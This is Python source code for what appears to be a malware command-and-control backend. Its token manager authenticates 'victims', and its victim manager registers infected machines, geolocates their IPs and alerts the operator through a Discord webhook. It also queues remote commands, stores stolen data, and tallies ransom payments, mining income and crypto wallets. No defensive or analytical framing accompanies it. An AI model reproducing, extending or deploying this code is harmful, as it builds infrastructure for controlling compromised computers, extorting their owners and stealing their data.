class TokenManager:
    def __init__(self):
        self._secret = config.ENCRYPTION_KEY.encode()
        self._token_cache = {}
        self._cache_lock = threading.Lock()
    
    def generate_token(self, victim_id: str, permissions: List[str] = None) -> str:
        timestamp = int(time.time())
        nonce = secrets.token_hex(8)
        
        if permissions is None:
            permissions = ['basic']
        
        payload = f"{victim_id}:{timestamp}:{nonce}:{','.join(permissions)}"
        signature = hmac.new(self._secret, payload.encode(), hashlib.sha256).hexdigest()
        
        token_data = f"{payload}:{signature}"
        token = base64.urlsafe_b64encode(token_data.encode()).decode().rstrip('=')
        
        token_hash = hashlib.sha256(token.encode()).hexdigest()
        
        with db.transaction() as conn:
            conn.execute("""
                INSERT OR REPLACE INTO tokens (token_hash, victim_id, created_at, permissions)
                VALUES (?, ?, ?, ?)
            """, (token_hash, victim_id, timestamp, ','.join(permissions) if permissions else ''))
        
        with self._cache_lock:
            self._token_cache[token] = {
                'victim_id': victim_id,
                'permissions': permissions,
                'created_at': timestamp
            }
        
        return token
    
    def verify_token(self, token: str) -> Tuple[bool, Optional[str], Optional[List[str]]]:
        try:
            with self._cache_lock:
                if token in self._token_cache:
                    cached = self._token_cache[token]
                    if time.time() - cached['created_at'] < 86400:
                        return True, cached['victim_id'], cached['permissions']
            
            padding = 4 - (len(token) % 4)
            if padding != 4:
                token += '=' * padding
            
            decoded = base64.urlsafe_b64decode(token).decode()
            parts = decoded.split(':')
            
            if len(parts) < 5:
                return False, None, None
            
            victim_id = parts[0]
            timestamp = int(parts[1])
            nonce = parts[2]
            permissions = parts[3].split(',')
            signature = parts[4]
            
            payload = f"{victim_id}:{timestamp}:{nonce}:{','.join(permissions)}"
            expected_signature = hmac.new(self._secret, payload.encode(), hashlib.sha256).hexdigest()
            
            if not hmac.compare_digest(signature, expected_signature):
                return False, None, None
            
            if time.time() - timestamp > 86400:
                return False, None, None
            
            token_hash = hashlib.sha256(token.encode()).hexdigest()
            with db.transaction() as conn:
                existing = conn.execute(
                    "SELECT 1 FROM tokens WHERE token_hash = ? AND is_active = 1",
                    (token_hash,)
                ).fetchone()
                
                if not existing:
                    return False, None, None
            
            with self._cache_lock:
                self._token_cache[token] = {
                    'victim_id': victim_id,
                    'permissions': permissions,
                    'created_at': timestamp
                }
            
            return True, victim_id, permissions
            
        except Exception as e:
            logger.error(f"Token verification error: {e}")
            return False, None, None
    
    def revoke_token(self, token: str) -> bool:
        try:
            token_hash = hashlib.sha256(token.encode()).hexdigest()
            with db.transaction() as conn:
                conn.execute("UPDATE tokens SET is_active = 0 WHERE token_hash = ?", (token_hash,))
            
            with self._cache_lock:
                if token in self._token_cache:
                    del self._token_cache[token]
            
            return True
        except:
            return False

token_manager = TokenManager()

class VictimManager:
    def __init__(self):
        self._online_victims = {}
        self._lock = threading.Lock()
        self._geo_cache = {}
    
    def register_victim(self, victim_data: Dict[str, Any]) -> str:
        victim_id = victim_data.get('victim_id') or str(uuid.uuid4())
        timestamp = int(time.time())
        
        ip_address = victim_data.get('ip_address', '')
        geo_info = self._get_geo_location(ip_address)
        
        with self._lock:
            with db.transaction() as conn:
                existing = conn.execute(
                    "SELECT victim_id FROM victims WHERE victim_id = ?",
                    (victim_id,)
                ).fetchone()
                
                if existing:
                    conn.execute("""
                        UPDATE victims SET
                            country_code = ?, country_name = ?, os_type = ?, os_version = ?,
                            status = ?, last_seen = ?, ip_address = ?, hostname = ?,
                            username = ?, latitude = ?, longitude = ?, city = ?, region = ?
                        WHERE victim_id = ?
                    """, (
                        geo_info.get('country_code', 'UN'),
                        geo_info.get('country_name', 'Unknown'),
                        victim_data.get('os_type', 'Unknown'),
                        victim_data.get('os_version', 'Unknown'),
                        VictimStatus.ONLINE.value,
                        timestamp,
                        ip_address,
                        victim_data.get('hostname', 'Unknown'),
                        victim_data.get('username', 'Unknown'),
                        geo_info.get('latitude'),
                        geo_info.get('longitude'),
                        geo_info.get('city'),
                        geo_info.get('region'),
                        victim_id
                    ))
                else:
                    conn.execute("""
                        INSERT INTO victims (
                            victim_id, country_code, country_name, os_type, os_version,
                            status, last_seen, ip_address, hostname, username,
                            infection_date, tags, notes, latitude, longitude, city, region
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """, (
                        victim_id,
                        geo_info.get('country_code', 'UN'),
                        geo_info.get('country_name', 'Unknown'),
                        victim_data.get('os_type', 'Unknown'),
                        victim_data.get('os_version', 'Unknown'),
                        VictimStatus.ONLINE.value,
                        timestamp,
                        ip_address,
                        victim_data.get('hostname', 'Unknown'),
                        victim_data.get('username', 'Unknown'),
                        timestamp,
                        victim_data.get('tags', ''),
                        victim_data.get('notes', ''),
                        geo_info.get('latitude'),
                        geo_info.get('longitude'),
                        geo_info.get('city'),
                        geo_info.get('region')
                    ))
            
            self._online_victims[victim_id] = {
                'last_seen': timestamp,
                'ip_address': ip_address,
                'hostname': victim_data.get('hostname', 'Unknown')
            }
            
            self._send_discord_notification(victim_id, geo_info, victim_data)
            
            return victim_id
    
    def _get_geo_location(self, ip_address: str) -> Dict[str, Any]:
        if ip_address in self._geo_cache:
            return self._geo_cache[ip_address]
        
        if ip_address in ('127.0.0.1', 'localhost', '::1', '192.168.', '10.', '172.'):
            geo_info = {
                'country_code': 'LOCAL',
                'country_name': 'Local Network',
                'latitude': None,
                'longitude': None,
                'city': 'Local',
                'region': 'Local'
            }
        else:
            try:
                response = urllib.request.urlopen(f'http://ip-api.com/json/{ip_address}', timeout=5)
                data = json.loads(response.read().decode())
                
                geo_info = {
                    'country_code': data.get('countryCode', 'UN'),
                    'country_name': data.get('country', 'Unknown'),
                    'latitude': data.get('lat'),
                    'longitude': data.get('lon'),
                    'city': data.get('city'),
                    'region': data.get('regionName')
                }
            except:
                geo_info = {
                    'country_code': 'UN',
                    'country_name': 'Unknown',
                    'latitude': None,
                    'longitude': None,
                    'city': None,
                    'region': None
                }
        
        self._geo_cache[ip_address] = geo_info
        return geo_info
    
    def _send_discord_notification(self, victim_id: str, geo_info: Dict, victim_data: Dict):
        if not config.DISCORD_WEBHOOK_URL:
            return
        
        try:
            embed = {
                "title": "🆕 New Victim Connected",
                "color": 0x00ff88,
                "fields": [
                    {"name": "Victim ID", "value": victim_id[:16], "inline": True},
                    {"name": "Country", "value": f"{geo_info.get('country_flag', '')} {geo_info.get('country_name', 'Unknown')}", "inline": True},
                    {"name": "OS", "value": f"{victim_data.get('os_type', 'Unknown')} {victim_data.get('os_version', '')}", "inline": True},
                    {"name": "IP Address", "value": victim_data.get('ip_address', 'Unknown'), "inline": True},
                    {"name": "Hostname", "value": victim_data.get('hostname', 'Unknown'), "inline": True},
                    {"name": "Username", "value": victim_data.get('username', 'Unknown'), "inline": True}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            
            webhook_data = {"embeds": [embed]}
            req = urllib.request.Request(
                config.DISCORD_WEBHOOK_URL,
                data=json.dumps(webhook_data).encode(),
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception as e:
            logger.error(f"Discord webhook error: {e}")
    
    def update_status(self, victim_id: str, status: str):
        timestamp = int(time.time())
        with db.transaction() as conn:
            conn.execute(
                "UPDATE victims SET status = ?, last_seen = ? WHERE victim_id = ?",
                (status, timestamp, victim_id)
            )
        
        with self._lock:
            if victim_id in self._online_victims:
                self._online_victims[victim_id]['last_seen'] = timestamp
            elif status == VictimStatus.ONLINE.value:
                self._online_victims[victim_id] = {'last_seen': timestamp}
    
    def get_victims(self, filters: Dict = None, limit: int = 100, offset: int = 0) -> List[Dict]:
        query = "SELECT * FROM victims WHERE is_active = 1"
        params = []
        
        if filters:
            if 'status' in filters:
                query += " AND status = ?"
                params.append(filters['status'])
            if 'country_code' in filters:
                query += " AND country_code = ?"
                params.append(filters['country_code'])
            if 'os_type' in filters:
                query += " AND os_type = ?"
                params.append(filters['os_type'])
            if 'search' in filters:
                query += " AND (hostname LIKE ? OR username LIKE ? OR ip_address LIKE ?)"
                search_term = f"%{filters['search']}%"
                params.extend([search_term, search_term, search_term])
        
        query += " ORDER BY last_seen DESC LIMIT ? OFFSET ?"
        params.extend([limit, offset])
        
        with db.transaction() as conn:
            rows = conn.execute(query, params).fetchall()
            return [dict(row) for row in rows]
    
    def get_stats(self) -> Dict[str, Any]:
        timestamp = int(time.time())
        day_ago = timestamp - 86400
        
        with db.transaction() as conn:
            total_victims = conn.execute(
                "SELECT COUNT(*) as count FROM victims WHERE is_active = 1"
            ).fetchone()['count']
            
            online_victims = conn.execute(
                "SELECT COUNT(*) as count FROM victims WHERE status = ? AND is_active = 1",
                (VictimStatus.ONLINE.value,)
            ).fetchone()['count']
            
            new_today = conn.execute(
                "SELECT COUNT(*) as count FROM victims WHERE infection_date > ? AND is_active = 1",
                (day_ago,)
            ).fetchone()['count']
            
            countries = conn.execute(
                "SELECT COUNT(DISTINCT country_code) as count FROM victims WHERE is_active = 1"
            ).fetchone()['count']
            
            country_stats = conn.execute("""
                SELECT country_code, country_name, COUNT(*) as count 
                FROM victims WHERE is_active = 1 
                GROUP BY country_code ORDER BY count DESC LIMIT 10
            """).fetchall()
            
            os_stats = conn.execute("""
                SELECT os_type, COUNT(*) as count 
                FROM victims WHERE is_active = 1 
                GROUP BY os_type
            """).fetchall()
            
            total_revenue = conn.execute(
                "SELECT SUM(revenue_generated) as total FROM victims"
            ).fetchone()['total'] or 0
            
            total_ransom = conn.execute(
                "SELECT SUM(ransom_paid) as total FROM victims"
            ).fetchone()['total'] or 0
            
            total_mined = conn.execute(
                "SELECT SUM(crypto_mined) as total FROM victims"
            ).fetchone()['total'] or 0
            
            timeline = conn.execute("""
                SELECT strftime('%H:00', datetime(infection_date, 'unixepoch')) as hour,
                       COUNT(*) as count
                FROM victims WHERE infection_date > ?
                GROUP BY hour ORDER BY infection_date DESC LIMIT 24
            """, (day_ago,)).fetchall()
        
        return {
            'total_victims': total_victims,
            'online_victims': online_victims,
            'new_today': new_today,
            'countries_affected': countries,
            'country_stats': [dict(row) for row in country_stats],
            'os_stats': [dict(row) for row in os_stats],
            'total_revenue': total_revenue,
            'total_ransom': total_ransom,
            'total_mined': total_mined,
            'timeline': [dict(row) for row in reversed(timeline)],
            'wallets': config.CRYPTO_WALLETS
        }
    
    def add_command(self, victim_id: str, command_type: str, command_data: Dict) -> int:
        with db.transaction() as conn:
            cursor = conn.execute("""
                INSERT INTO victim_commands (victim_id, command_type, command_data, created_at)
                VALUES (?, ?, ?, ?)
            """, (victim_id, command_type, json.dumps(command_data), int(time.time())))
            return cursor.lastrowid
    
    def get_pending_commands(self, victim_id: str) -> List[Dict]:
        with db.transaction() as conn:
            rows = conn.execute("""
                SELECT * FROM victim_commands 
                WHERE victim_id = ? AND status = 'pending'
                ORDER BY created_at ASC
            """, (victim_id,)).fetchall()
            
            commands = []
            for row in rows:
                cmd = dict(row)
                cmd['command_data'] = json.loads(cmd['command_data'])
                commands.append(cmd)
            
            return commands
    
    def update_command_result(self, command_id: int, result: Any):
        with db.transaction() as conn:
            conn.execute("""
                UPDATE victim_commands 
                SET status = 'completed', executed_at = ?, result = ?
                WHERE command_id = ?
            """, (int(time.time()), json.dumps(result), command_id))
    
    def store_stolen_data(self, victim_id: str, data_type: str, data_content: Any, data_value: float = 0):
        with db.transaction() as conn:
            conn.execute("""
                INSERT INTO stolen_data (victim_id, data_type, data_content, data_value, collected_at)
                VALUES (?, ?, ?, ?, ?)
            """, (victim_id, data_type, json.dumps(data_content), data_value, int(time.time())))
    
    def get_stolen_data(self, victim_id: str = None, data_type: str = None, limit: int = 100) -> List[Dict]:
        query = "SELECT * FROM stolen_data WHERE 1=1"
        params = []
        
        if victim_id:
            query += " AND victim_id = ?"
            params.append(victim_id)
        if data_type:
            query += " AND data_type = ?"
            params.append(data_type)
        
        query += " ORDER BY collected_at DESC LIMIT ?"
        params.append(limit)
        
        with db.transaction() as conn:
            rows = conn.execute(query, params).fetchall()
            data = []
            for row in rows:
                item = dict(row)
                item['data_content'] = json.loads(item['data_content'])
                data.append(item)
            return data

